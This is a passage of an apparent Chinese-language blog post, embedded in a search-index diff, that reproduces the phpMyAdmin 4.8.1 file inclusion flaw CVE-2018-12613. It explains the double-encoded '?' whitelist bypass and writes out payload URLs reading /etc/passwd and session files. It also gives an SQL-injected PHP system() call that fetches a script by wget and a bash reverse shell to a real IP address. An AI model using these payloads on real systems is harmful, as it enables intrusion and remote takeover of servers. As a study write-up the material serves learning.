mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    ); <span class="comment">//按?分割字符串，取前半部分</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    ); <span class="comment">//按?分割字符串，取前半部分</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>前面是一些简单的判断，然后文件名必须在白名单里。接下来按问号分割字符串，目的是适应<code>target=view.php?id=1</code>这种情况，分割后<code>$_page</code>仍然是view.php。</p>
+<p>漏洞就出现在下面<code>urldecode</code>这里，如果提交<code>db_sql.php%253f/../../../../test.txt</code>，其中db_sql.php是白名单中的文件名，<code>%253f</code>是<code>?</code>的双重urlencode，php会自动进行一次urldecode，第一次分割的时候浏览器会进行一次urldecode，为<code>db_sql.php%3f/../../../../test.txt</code></p>
+<p>第二次分割php会再一次进行urldecode，此时变为<code>db_sql.php?/../../../../test.txt</code>，使得代码返回true，导致了漏洞的产生</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id><a href="#" class="headerlink" title></a></h2><h2 id="普通包含"><a href="#普通包含" class="headerlink" title="普通包含"></a>普通包含</h2><p>访问：index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd触发文件包含漏洞<br><img src="/2020/08/13/CVE-2018-12613/1595669784768.png" alt="1595669784768"></p>
+<h2 id="session日志文件包含"><a href="#session日志文件包含" class="headerlink" title="session日志文件包含"></a>session日志文件包含</h2><p>再kali里通过searchsploit搜索phpmyadmin 4.8.1可得到该漏洞的利用方式<br><img src="/2020/08/13/CVE-2018-12613/1595669962937.png" alt="1595669962937"></p>
+<p>首先执行<code>select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></p>
+<p><img src="/2020/08/13/CVE-2018-12613/1595670039850.png" alt="1595670039850"></p>
+<p>再包含session文件即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../../../../<span class="keyword">var</span>/lib/php/sessions/sess_fdcead68b27b922b4dcaf483f74126c3</span><br></pre></td></tr></table></figure>
+
+<p>该环境的session日志文件位置为/tmp目录下，所以访问即可成功包含</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../../../../tmp/sess_fdcead68b27b922b4dcaf483f74126c3</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/13/CVE-2018-12613/1595670165510.png" alt="1595670165510"></p>
+<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>首先再自己的服务器上创建一个.sh文件供靶机下载，内容为</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/116.62.104.172/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>之后执行SQL语句</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">'&lt;?php system("wget 116.62.104.172:88/shell.sh; chmod +x shell.sh; bash shell.sh");exit;?&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/08/13/CVE-2018-12613/1595670854022.png" alt="1595670854022"></p>
+<p>之后包含session文件，服务器监听7777端口即可，但是该环境不能访问外网，所以未成功</p>
+<p>在之前的靶机<a href="http://cyzcc.vip/2020/09/29/Presidential-01/">Presidential-01</a>中已经成功复现</p>
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
       </tags>
   </entry>
 </search>
